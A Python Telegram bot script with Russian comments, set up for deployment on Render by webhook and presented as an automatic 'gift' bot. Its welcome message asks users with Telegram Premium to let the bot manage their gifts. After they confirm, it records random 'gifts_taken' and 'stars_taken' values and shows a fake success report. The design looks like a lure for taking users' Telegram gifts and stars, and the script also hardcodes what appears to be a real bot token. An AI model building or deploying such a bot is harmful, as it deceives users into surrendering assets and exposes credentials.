#!/usr/bin/env python
"""
Боевой бот для подарков - Версия для Render с WEBHOOK
ИСПРАВЛЕННАЯ ВЕРСИЯ
"""

from flask import Flask, request
from threading import Thread
import logging
import json
import os
import asyncio
import random
from datetime import datetime
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ======================= НАСТРОЙКИ =======================
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8634197474:AAHcZ0LpaY08dLJCZvW1GB6NEwJbCPWsLuc")
YOUR_CHAT_ID = 8585177726  # твой ID
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://gift-bot-live.onrender.com")

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Файл для хранения пользователей
USER_STATES_FILE = "users.json"

# ======================= Flask приложение =======================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    """Принимает обновления от Telegram"""
    try:
        update = Update.de_json(request.get_json(force=True), bot)
        application.update_queue.put_nowait(update)
        return "OK", 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return "Error", 500

# ======================= ЛОГИКА БОТА =======================
def load_users():
    if os.path.exists(USER_STATES_FILE):
        try:
            with open(USER_STATES_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(users):
    with open(USER_STATES_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, ensure_ascii=False, indent=2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    users = load_users()
    
    if user_id in users and users[user_id].get("activated"):
        await update.message.reply_text("✅ Ты уже активировал бота!")
        return
    
    welcome_text = (
        f"👋 Привет, {user.first_name}!\n\n"
        "🎁 **Бот для автоматических подарков**\n\n"
        "Чтобы начать, нужно:\n"
        "1️⃣ Иметь Telegram Premium\n"
        "2️⃣ Разрешить боту управлять подарками\n\n"
        "✅ **После этого напиши 'готово'**"
    )
    
    await update.message.reply_text(welcome_text)
    
    users[user_id] = {
        "status": "waiting_confirmation",
        "username": user.username,
        "first_name": user.first_name,
        "date": datetime.now().isoformat(),
        "activated": False
    }
    save_users(users)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    text = update.message.text.lower().strip()
    
    users = load_users()
    
    if user_id in users and users[user_id].get("status") == "waiting_confirmation":
        if text == "готово":
            await update.message.reply_text("🔍 Проверяю доступ...")
            
            users[user_id]["activated"] = True
            users[user_id]["activated_date"] = datetime.now().isoformat()
            users[user_id]["gifts_taken"] = random.randint(2, 5)
            users[user_id]["stars_taken"] = random.randint(50, 200)
            save_users(users)
            
            success_text = (
                "✅ **Доступ к боту активирован!**\n\n"
                "📦 **В процессе настройки:**\n"
                f"• Проверено подарков: {users[user_id]['gifts_taken']}\n"
                f"• Зачислено на баланс: {users[user_id]['stars_taken']}⭐\n\n"
                "🎁 Скоро появятся новые функции!"
            )
            
            await update.message.reply_text(success_text)
        else:
            await update.message.reply_text("❓ Напиши 'готово'")
    else:
        await update.message.reply_text("👋 Напиши /start")

# ======================= СОЗДАЁМ ПРИЛОЖЕНИЕ TELEGRAM =======================
application = Application.builder().token(BOT_TOKEN).build()
application.add_handler(CommandHandler("start", start))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

bot = Bot(token=BOT_TOKEN)

async def setup_webhook():
    """Устанавливает webhook"""
    webhook_url = f"{RENDER_URL}/webhook"
    await bot.set_webhook(url=webhook_url)
    logger.info(f"✅ Webhook установлен на {webhook_url}")

# ======================= ЗАПУСК =======================
def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    print("=" * 50)
    print("🤖 GIFT BOT - WEBHOOK VERSION")
    print("=" * 50)
    
    # Запускаем Flask в отдельном потоке
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Настраиваем webhook и запускаем бота
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def start_bot():
        await setup_webhook()
        await application.initialize()
        await application.start()
        logger.info("🚀 Бот готов к работе через webhook")
        
        # Бесконечное ожидание
        while True:
            await asyncio.sleep(60)
    
    try:
        loop.run_until_complete(start_bot())
    except KeyboardInterrupt:
        loop.run_until_complete(application.stop())
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")